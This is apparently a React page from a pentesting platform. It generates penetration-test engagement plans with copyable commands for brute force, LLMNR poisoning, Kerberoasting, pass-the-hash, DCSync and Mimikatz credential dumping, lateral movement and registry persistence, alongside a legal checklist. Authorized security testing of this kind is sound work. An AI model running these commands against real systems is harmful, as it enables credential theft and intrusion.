'use client'

import { useState, useEffect } from 'react'
import { useSession } from 'next-auth/react'
import { useRouter } from 'next/navigation'
import { Navbar } from '@/components/Navbar'

type EngagementType = 'web-app' | 'network' | 'active-directory' | 'mobile' | 'api-cloud' | 'red-team' | 'physical'
type Timeframe = '1 day' | '3 days' | '1 week' | '2 weeks' | '1 month'

interface EngagementInput {
  types: EngagementType[]
  targets: string
  objectives: string
  restrictions: string
  timeframe: Timeframe
}

interface Phase {
  name: string
  priority: 'critical' | 'high' | 'medium' | 'low'
  tools: string[]
  commands: string[]
  notes?: string
}

interface EngagementPlan {
  summary: string
  riskLevel: 'Critical' | 'High' | 'Medium' | 'Low'
  phases: Phase[]
  deliverables: string[]
  legalReminder: string[]
}

function generatePlan(input: EngagementInput): EngagementPlan {
  const phases: Phase[] = []
  const targets = input.targets.split('\n').map(t => t.trim()).filter(Boolean)
  const t = targets[0] || '<target>'
  const isAD = input.types.includes('active-directory')
  const isWeb = input.types.includes('web-app') || input.types.includes('api-cloud')
  const isNetwork = input.types.includes('network') || input.types.includes('red-team')
  const isMobile = input.types.includes('mobile')

  phases.push({
    name: 'Phase 1 — Passive Reconnaissance',
    priority: 'critical',
    tools: ['theHarvester', 'Subfinder', 'Amass', 'Shodan'],
    commands: [
      `# OSINT — emails and subdomains`,
      `theHarvester -d ${t} -b all -f recon_${t}.html`,
      `subfinder -d ${t} -all -recursive -o subs.txt`,
      `amass enum -passive -d ${t} -o amass_subs.txt`,
      `cat subs.txt amass_subs.txt | sort -u > all_subs.txt`,
      ``,
      `# Shodan`,
      `shodan search "hostname:${t}"`,
      `shodan search "ssl:${t} port:443"`,
      ``,
      `# Whois / DNS`,
      `whois ${t}`,
      `dig ${t} ANY +short`,
      `dnsx -l all_subs.txt -a -mx -ns -cname -silent`,
    ],
    notes: 'Generates no direct traffic to the target. Safe for the initial phase.',
  })

  phases.push({
    name: 'Phase 2 — Active Reconnaissance',
    priority: 'critical',
    tools: ['Nmap', 'Rustscan', 'httpx'],
    commands: [
      `# Live host discovery`,
      `nmap -sn ${targets.length > 1 ? targets.join(' ') : t + '/24'} -oG hosts_alive.txt`,
      ``,
      `# Full port scan`,
      `nmap -sV -sC -p- --open -T4 ${t} -oX nmap_full.xml`,
      ``,
      `# Rustscan (faster)`,
      `rustscan -a ${t} --ulimit 5000 -- -sV -sC`,
      ``,
      `# Live web services`,
      `cat all_subs.txt | httpx -silent -status-code -title -tech-detect -o web_alive.txt`,
      ``,
      `# Screenshots`,
      `cat web_alive.txt | httpx -screenshot -o screenshots/`,
    ],
  })

  if (isWeb) {
    phases.push({
      name: 'Phase 3 — Web / API Analysis',
      priority: 'high',
      tools: ['Burp Suite', 'ffuf', 'Nuclei', 'SQLmap'],
      commands: [
        `# Directory fuzzing`,
        `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://${t}/FUZZ -mc 200,301,302 -o ffuf_dirs.json`,
        ``,
        `# Parameters (Wayback)`,
        `waybackurls ${t} | grep "?.*=" | sort -u > wayback_params.txt`,
        `gau ${t} >> wayback_params.txt`,
        ``,
        `# Nuclei — known vulnerabilities`,
        `nuclei -u https://${t} -s critical,high -o nuclei_results.txt`,
        `nuclei -u https://${t} -t cves/ -t technologies/`,
        ``,
        `# Automated SQLi (only if authorized)`,
        `sqlmap -u "http://${t}/page?id=1" --batch --level=3 --risk=2`,
        ``,
        `# Burp Suite — manual review (proxy 127.0.0.1:8080)`,
        `# Focos: IDOR, XSS, SSRF, SSTI, Auth bypass, Business logic`,
      ],
      notes: input.restrictions ? `Restrictions: ${input.restrictions}` : undefined,
    })
  }

  if (isNetwork && !isWeb) {
    phases.push({
      name: 'Phase 3 — Network Exploitation',
      priority: 'high',
      tools: ['Metasploit', 'Hydra', 'Responder'],
      commands: [
        `# Vulnerabilities with Metasploit`,
        `msfconsole -q -x "db_nmap -sV ${t}; vulns"`,
        ``,
        `# SMB (EternalBlue check)`,
        `nmap --script smb-vuln-ms17-010 ${t}`,
        ``,
        `# Brute force SSH`,
        `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://${t} -t 4`,
        ``,
        `# LLMNR poisoning (internal network)`,
        `sudo responder -I eth0 -rdwv`,
      ],
    })
  }

  if (isAD) {
    phases.push({
      name: (isWeb ? 'Phase 4' : 'Phase 3') + ' — Active Directory',
      priority: 'critical',
      tools: ['BloodHound', 'Impacket', 'CrackMapExec', 'Mimikatz'],
      commands: [
        `# AD enumeration (credentials required)`,
        `crackmapexec smb ${t} -u '' -p '' --shares  # null session`,
        ``,
        `# Kerberoasting`,
        `GetUserSPNs.py domain.local/user:pass -dc-ip ${t} -request -outputfile kerberoast.hashes`,
        `hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`,
        ``,
        `# AS-REP Roasting`,
        `GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip ${t}`,
        ``,
        `# BloodHound collection`,
        `bloodhound-python -u user -p pass -d domain.local -dc ${t} -c All`,
        ``,
        `# Pass-the-Hash`,
        `crackmapexec smb ${t} -u admin -H <NTLM_HASH>`,
        ``,
        `# DCSync (if Domain Admin)`,
        `secretsdump.py domain.local/admin:pass@${t}`,
      ],
    })
  }

  if (isMobile) {
    phases.push({
      name: 'Phase 3 — Mobile',
      priority: 'medium',
      tools: ['apktool', 'MobSF', 'Frida', 'Burp Suite'],
      commands: [
        `# Decompile APK`,
        `apktool d app.apk -o app_decompiled/`,
        ``,
        `# Static analysis — MobSF`,
        `docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf`,
        ``,
        `# Frida — runtime manipulation (device root)`,
        `frida -U -l hook_ssl.js -f com.target.app`,
        ``,
        `# Burp proxy to intercept traffic`,
        `# Configure the device proxy: <LHOST>:8080`,
        `# Install the Burp certificate on the device`,
      ],
    })
  }

  if (input.types.includes('red-team') || isAD) {
    phases.push({
      name: 'Fase — Post-Exploitation & Persistence',
      priority: 'medium',
      tools: ['Meterpreter', 'PowerSploit', 'Mimikatz'],
      commands: [
        `# Meterpreter — escalation`,
        `getsystem`,
        `getuid`,
        `migrate <PID_winlogon>`,
        ``,
        `# Dump credentials`,
        `load kiwi`,
        `creds_all`,
        ``,
        `# Lateral movement`,
        `crackmapexec smb 10.0.0.0/24 -u admin -H <hash> --continue-on-success`,
        ``,
        `# Persistence (for demonstration — remove at the end)`,
        `# reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persist /d "cmd.exe /c ..."`,
      ],
    })
  }

  phases.push({
    name: 'Final Phase — Cleanup & Report',
    priority: 'high',
    tools: ['Dradis / Cherry Tree', 'Screenshots', 'Metasploit loot'],
    commands: [
      `# Remove leftover artifacts`,
      `# Delete shells, temp files, backdoors`,
      ``,
      `# Compile evidence`,
      `ls -la /root/.msf4/loot/`,
      `ls -la screenshots/`,
      ``,
      `# Report`,
      `# 1. Executive Summary`,
      `# 2. Scope and methodology`,
      `# 3. Findings by severity (Critical → Low)`,
      `# 4. Proof-of-concept for each finding`,
      `# 5. Remediation recommendations`,
      `# 6. Appendix — raw outputs`,
    ],
  })

  const riskLevels: EngagementPlan['riskLevel'][] = ['Critical', 'High', 'Medium', 'Low']
  const riskIdx = isAD ? 0 : input.types.includes('red-team') ? 0 : isNetwork ? 1 : 2
  const riskLevel = riskLevels[riskIdx]

  const engagementLabels: Record<EngagementType, string> = {
    'web-app': 'Web App', 'network': 'Network/Infra', 'active-directory': 'Active Directory',
    'mobile': 'Mobile', 'api-cloud': 'API/Cloud', 'red-team': 'Red Team', 'physical': 'Physical',
  }

  return {
    summary: `Engagement ${input.types.map(t => engagementLabels[t]).join(' + ')} on ${targets.length} target(s) with a ${input.timeframe} timeframe.${input.objectives ? ' Objective: ' + input.objectives.slice(0, 80) + '.' : ''}`,
    riskLevel,
    phases,
    deliverables: [
      'Executive report (PDF)',
      'Technical report with PoC screenshots',
      'Tool outputs (Nmap XML, Nuclei JSON)',
      'BloodHound data (if AD)',
      'Vulnerability list with CVSS scores',
      'Prioritized remediation recommendations',
    ],
    legalReminder: [
      '✅ Confirm a signed, written Rules of Engagement (RoE)',
      '✅ Verify in-scope IPs/domains before any action',
      '✅ Do not test in production without explicit authorization',
      input.restrictions ? `⛔ Out-of-scope: ${input.restrictions}` : '✅ Confirm specific restrictions with the client',
      '✅ Keep a log of all actions with timestamps',
      '✅ Stop immediately if you find unauthorized third-party data',
    ],
  }
}

const priorityConfig = {
  critical: { color: '#ef4444', bg: '#7f1d1d', label: 'CRITICAL' },
  high: { color: '#f59e0b', bg: '#78350f', label: 'HIGH' },
  medium: { color: '#3b82f6', bg: '#1e3a5f', label: 'MEDIUM' },
  low: { color: '#22c55e', bg: '#14532d', label: 'LOW' },
}

function renderMarkdown(text: string): string {
  return text
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/^### (.+)$/gm, '<h3 style="color:#e2e8f0;font-size:0.8rem;margin:12px 0 4px;text-transform:uppercase;letter-spacing:0.04em">$1</h3>')
    .replace(/^## (.+)$/gm, '<h2 style="color:#00d4ff;font-size:0.85rem;margin:16px 0 6px;border-bottom:1px solid #1e3a5f;padding-bottom:4px;text-transform:uppercase;letter-spacing:0.06em">$1</h2>')
    .replace(/```[a-z]*\n([\s\S]*?)```/g, (_m, c) => `<pre style="background:#070b14;border:1px solid #1e3a5f;border-radius:6px;padding:10px;overflow-x:auto;color:#00ff9d;font-size:0.72rem;line-height:1.6">${c.replace(/\n$/,'')}</pre>`)
    .replace(/`([^`]+)`/g, '<code style="background:#0a0e1a;color:#00ff9d;padding:1px 5px;border-radius:3px;border:1px solid #1e3a5f">$1</code>')
    .replace(/\*\*(.+?)\*\*/g, '<strong style="color:#fff">$1</strong>')
    .replace(/^- (.+)$/gm, '<li style="color:#94a3b8;margin-left:16px;list-style:disc;font-size:0.78rem;line-height:1.7">$1</li>')
    .replace(/^\d+\. (.+)$/gm, '<li style="color:#94a3b8;margin-left:16px;list-style:decimal;font-size:0.78rem;line-height:1.7">$1</li>')
    .replace(/\n\n/g, '<br/>')
}

export default function ScopeAnalyzerPage() {
  const { data: session, status } = useSession()
  const router = useRouter()
  const [input, setInput] = useState<EngagementInput>({
    types: ['web-app'], targets: '', objectives: '', restrictions: '', timeframe: '1 week',
  })
  const [plan, setPlan] = useState<EngagementPlan | null>(null)
  const [copiedIdx, setCopiedIdx] = useState<number | null>(null)
  const [aiLoading, setAiLoading] = useState(false)
  const [aiPlan, setAiPlan] = useState<string | null>(null)
  const [aiError, setAiError] = useState<string | null>(null)

  useEffect(() => { if (status === 'unauthenticated') router.push('/login') }, [status, router])

  if (status === 'loading') return <div className="flex items-center justify-center min-h-screen" style={{ background: '#0a0e1a', color: '#00d4ff', fontFamily: 'monospace' }}>Loading…</div>
  if (!session) return null

  function toggleType(t: EngagementType) {
    setInput(prev => ({ ...prev, types: prev.types.includes(t) ? prev.types.filter(x => x !== t) : [...prev.types, t] }))
    setPlan(null)
  }

  function analyze() {
    if (!input.targets.trim()) return
    setPlan(generatePlan(input))
  }

  async function analyzeAI() {
    if (!input.targets.trim()) return
    setAiLoading(true); setAiPlan(null); setAiError(null)
    const engagement_type = (input.types[0] || 'web-app').replace(/-/g, '_')
    const extraTypes = input.types.slice(1).map(t => t.replace(/-/g, '_')).join(', ')
    try {
      const res = await fetch('https://mcp.cyberopsplatform.co.uk/api/scope-analyser', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          engagement_type,
          targets: input.targets,
          objectives: input.objectives,
          restrictions: input.restrictions,
          additional_context: `Available timeframe: ${input.timeframe}` + (extraTypes ? `. Additional engagement types: ${extraTypes}` : ''),
        }),
      })
      const json = await res.json()
      if (json.status === 'error' || json.error) setAiError(json.error ?? 'Gemini request failed on the gateway')
      else if (json.plan) setAiPlan(json.plan as string)
      else setAiError('Empty response from the gateway')
    } catch { setAiError('Could not reach the MCP gateway') } finally { setAiLoading(false) }
  }

  function copyCommands(cmds: string[], idx: number) {
    navigator.clipboard.writeText(cmds.join('\n')).then(() => { setCopiedIdx(idx); setTimeout(() => setCopiedIdx(null), 1500) })
  }

  const engagementTypes: { id: EngagementType; label: string; icon: string }[] = [
    { id: 'web-app', label: 'Web App', icon: '🌐' },
    { id: 'network', label: 'Network / Infra', icon: '🔌' },
    { id: 'active-directory', label: 'Active Directory', icon: '🏢' },
    { id: 'mobile', label: 'Mobile', icon: '📱' },
    { id: 'api-cloud', label: 'API / Cloud', icon: '☁️' },
    { id: 'red-team', label: 'Red Team', icon: '🎯' },
    { id: 'physical', label: 'Physical', icon: '🚪' },
  ]

  return (
    <>
      <Navbar />
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="mb-6">
          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 4 }}>
            <span style={{ fontSize: '1.5rem' }}>🎯</span>
            <h1 className="text-2xl font-bold" style={{ color: '#e2e8f0', fontFamily: 'monospace' }}>Scope Analyzer</h1>
            <span style={{ background: '#1e3a5f', border: '1px solid #3b82f6', color: '#93c5fd', borderRadius: 4, padding: '2px 8px', fontSize: '0.65rem', fontFamily: 'monospace', fontWeight: 700 }}>Licensed Pentester</span>
          </div>
          <p style={{ color: '#64748b', fontSize: '0.875rem' }}>Pentest engagement planner — generates a prioritized plan with ready-to-run commands</p>
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="cyber-card p-6">
            <h2 style={{ color: '#00d4ff', fontFamily: 'monospace', fontSize: '0.85rem', fontWeight: 600, marginBottom: 20, textTransform: 'uppercase', letterSpacing: '0.08em' }}>Engagement Input</h2>
            <div style={{ border: '1px dashed #1e3a5f', borderRadius: 8, padding: '20px', textAlign: 'center', marginBottom: 20, color: '#334155', fontSize: '0.75rem', fontFamily: 'monospace' }}>
              <div style={{ fontSize: '2rem', marginBottom: 8 }}>📁</div>
              Fill in the fields below
              <div style={{ marginTop: 4, color: '#475569', fontSize: '0.7rem' }}>Scope doc · RoE · NDA · Briefing</div>
            </div>
            <div style={{ marginBottom: 16 }}>
              <label style={{ color: '#64748b', fontSize: '0.72rem', fontFamily: 'monospace', display: 'block', marginBottom: 8 }}>Engagement type</label>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                {engagementTypes.map(({ id, label, icon }) => (
                  <button key={id} onClick={() => toggleType(id)}
                    style={{ background: input.types.includes(id) ? '#00d4ff22' : 'transparent', border: `1px solid ${input.types.includes(id) ? '#00d4ff' : '#1e3a5f'}`, color: input.types.includes(id) ? '#00d4ff' : '#64748b', borderRadius: 6, padding: '5px 12px', fontSize: '0.75rem', cursor: 'pointer', fontFamily: 'monospace' }}>
                    {icon} {label}
                  </button>
                ))}
              </div>
            </div>
            <div style={{ marginBottom: 16 }}>
              <label style={{ color: '#64748b', fontSize: '0.72rem', fontFamily: 'monospace', display: 'block', marginBottom: 6 }}>Targets / IPs / Domains (one per line)</label>
              <textarea className="cyber-input" rows={4} placeholder={'app.client.com\n10.0.0.0/24\napi.client.com'} value={input.targets} onChange={e => { setInput(p => ({ ...p, targets: e.target.value })); setPlan(null) }} style={{ width: '100%', resize: 'vertical', fontFamily: 'monospace', fontSize: '0.8rem' }} />
            </div>
            <div style={{ marginBottom: 16 }}>
              <label style={{ color: '#64748b', fontSize: '0.72rem', fontFamily: 'monospace', display: 'block', marginBottom: 6 }}>Client-stated objectives</label>
              <textarea className="cyber-input" rows={3} placeholder="e.g. test web application security, assess external exposure…" value={input.objectives} onChange={e => { setInput(p => ({ ...p, objectives: e.target.value })); setPlan(null) }} style={{ width: '100%', resize: 'vertical', fontFamily: 'monospace', fontSize: '0.8rem' }} />
            </div>
            <div style={{ marginBottom: 16 }}>
              <label style={{ color: '#64748b', fontSize: '0.72rem', fontFamily: 'monospace', display: 'block', marginBottom: 6 }}>Restrictions / Exclusions (out-of-scope)</label>
              <textarea className="cyber-input" rows={2} placeholder="e.g. do not test in production, no DoS, avoid DB servers…" value={input.restrictions} onChange={e => { setInput(p => ({ ...p, restrictions: e.target.value })); setPlan(null) }} style={{ width: '100%', resize: 'vertical', fontFamily: 'monospace', fontSize: '0.8rem' }} />
            </div>
            <div style={{ marginBottom: 24 }}>
              <label style={{ color: '#64748b', fontSize: '0.72rem', fontFamily: 'monospace', display: 'block', marginBottom: 6 }}>Available timeframe</label>
              <select className="cyber-input" value={input.timeframe} onChange={e => { setInput(p => ({ ...p, timeframe: e.target.value as Timeframe })); setPlan(null) }} style={{ width: '100%', fontFamily: 'monospace', fontSize: '0.85rem' }}>
                {(['1 day', '3 days', '1 week', '2 weeks', '1 month'] as Timeframe[]).map(t => (
                  <option key={t} value={t}>{t}</option>
                ))}
              </select>
            </div>
            <button className="cyber-btn w-full" onClick={analyze} disabled={!input.targets.trim()} style={{ padding: '12px', fontSize: '0.9rem' }}>⚡ Analyze Scope & Generate Plan</button>
            <button onClick={analyzeAI} disabled={!input.targets.trim() || aiLoading} style={{ width: '100%', marginTop: 10, padding: '11px', fontSize: '0.85rem', fontFamily: 'monospace', borderRadius: 8, cursor: input.targets.trim() && !aiLoading ? 'pointer' : 'not-allowed', background: 'transparent', border: '1px solid #8b5cf6', color: '#c4b5fd' }}>{aiLoading ? '✨ Generating with Gemini…' : '✨ Generate with Gemini (AI)'}</button>
          </div>
          <div>
            {(aiLoading || aiPlan || aiError) && (
              <div className="cyber-card p-5" style={{ marginBottom: 16, borderColor: '#8b5cf6' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
                  <span style={{ color: '#c4b5fd', fontFamily: 'monospace', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em' }}>✨ AI Plan — Gemini</span>
                </div>
                {aiLoading && <div style={{ color: '#c4b5fd', fontFamily: 'monospace', fontSize: '0.8rem' }}>Generating with Gemini…</div>}
                {aiError && <div style={{ color: '#ff4444', fontFamily: 'monospace', fontSize: '0.78rem' }}>{aiError}</div>}
                {aiPlan && <div style={{ color: '#94a3b8', fontSize: '0.8rem', lineHeight: 1.6 }} dangerouslySetInnerHTML={{ __html: renderMarkdown(aiPlan) }} />}
              </div>
            )}
            {!plan ? (
              <div className="cyber-card p-10" style={{ textAlign: 'center', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 12 }}>
                <div style={{ fontSize: '3rem' }}>🎯</div>
                <div style={{ color: '#334155', fontFamily: 'monospace', fontSize: '0.85rem' }}>Fill in the engagement details</div>
                <div style={{ color: '#334155', fontFamily: 'monospace', fontSize: '0.85rem' }}>on the left and click Analyze.</div>
                <div style={{ color: '#475569', fontFamily: 'monospace', fontSize: '0.75rem', marginTop: 8 }}>You get a prioritized plan with</div>
                <div style={{ color: '#475569', fontFamily: 'monospace', fontSize: '0.75rem' }}>ready-to-run commands.</div>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                <div className="cyber-card p-5">
                  <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 12 }}>
                    <span style={{ color: '#00d4ff', fontFamily: 'monospace', fontSize: '0.8rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em' }}>Engagement Plan</span>
                    <span style={{ background: priorityConfig[plan.riskLevel.toLowerCase() as keyof typeof priorityConfig]?.bg ?? '#334155', border: `1px solid ${priorityConfig[plan.riskLevel.toLowerCase() as keyof typeof priorityConfig]?.color ?? '#64748b'}`, color: priorityConfig[plan.riskLevel.toLowerCase() as keyof typeof priorityConfig]?.color ?? '#94a3b8', borderRadius: 4, padding: '1px 8px', fontSize: '0.65rem', fontFamily: 'monospace', fontWeight: 700 }}>{plan.riskLevel.toUpperCase()}</span>
                  </div>
                  <p style={{ color: '#64748b', fontFamily: 'monospace', fontSize: '0.78rem', lineHeight: 1.6, margin: 0 }}>{plan.summary}</p>
                </div>
                <div className="cyber-card p-4" style={{ borderColor: '#78350f' }}>
                  <div style={{ color: '#f59e0b', fontFamily: 'monospace', fontSize: '0.72rem', fontWeight: 700, marginBottom: 8, textTransform: 'uppercase', letterSpacing: '0.06em' }}>⚖️ Legal Checklist</div>
                  {plan.legalReminder.map((item, i) => <div key={i} style={{ color: '#94a3b8', fontFamily: 'monospace', fontSize: '0.75rem', lineHeight: 2 }}>{item}</div>)}
                </div>
                {plan.phases.map((phase, i) => {
                  const pCfg = priorityConfig[phase.priority]
                  return (
                    <div key={i} className="cyber-card p-5" style={{ borderLeft: `3px solid ${pCfg.color}` }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
                        <span style={{ background: pCfg.bg, border: `1px solid ${pCfg.color}`, color: pCfg.color, borderRadius: 4, padding: '1px 6px', fontSize: '0.6rem', fontFamily: 'monospace', fontWeight: 700 }}>{pCfg.label}</span>
                        <span style={{ color: '#e2e8f0', fontFamily: 'monospace', fontSize: '0.85rem', fontWeight: 600 }}>{phase.name}</span>
                      </div>
                      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, marginBottom: 10 }}>
                        {phase.tools.map(tool => <span key={tool} style={{ background: '#070b14', border: '1px solid #1e3a5f', color: '#64748b', borderRadius: 4, padding: '1px 8px', fontSize: '0.65rem', fontFamily: 'monospace' }}>{tool}</span>)}
                      </div>
                      {phase.notes && <div style={{ color: '#f59e0b', fontFamily: 'monospace', fontSize: '0.72rem', marginBottom: 10, padding: '4px 8px', background: '#78350f22', borderRadius: 4 }}>⚠️ {phase.notes}</div>}
                      <div style={{ position: 'relative' }}>
                        <div style={{ background: '#070b14', border: '1px solid #1e3a5f', borderRadius: 6, padding: '10px 12px', maxHeight: 180, overflowY: 'auto' }}>
                          {phase.commands.map((cmd, j) => <pre key={j} style={{ margin: 0, fontFamily: 'monospace', fontSize: '0.72rem', color: cmd === '' ? 'transparent' : cmd.startsWith('#') ? '#475569' : '#00ff9d', lineHeight: cmd === '' ? '0.5' : '1.7', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{cmd || '.'}</pre>)}
                        </div>
                        <button onClick={() => copyCommands(phase.commands, i)} style={{ position: 'absolute', top: 8, right: 8, background: '#0d1424', border: '1px solid #1e3a5f', color: copiedIdx === i ? '#00d4ff' : '#475569', borderRadius: 4, padding: '2px 8px', fontSize: '0.65rem', cursor: 'pointer', fontFamily: 'monospace' }}>{copiedIdx === i ? '✓' : '⎘ Copy'}</button>
                      </div>
                    </div>
                  )
                })}
                <div className="cyber-card p-5">
                  <div style={{ color: '#00d4ff', fontFamily: 'monospace', fontSize: '0.75rem', fontWeight: 700, marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.06em' }}>📋 Deliverables</div>
                  {plan.deliverables.map((d, i) => <div key={i} style={{ color: '#64748b', fontFamily: 'monospace', fontSize: '0.78rem', lineHeight: 2, display: 'flex', alignItems: 'center', gap: 8 }}><span style={{ color: '#00d4ff', fontSize: '0.6rem' }}>▸</span> {d}</div>)}
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
    </>
  )
}
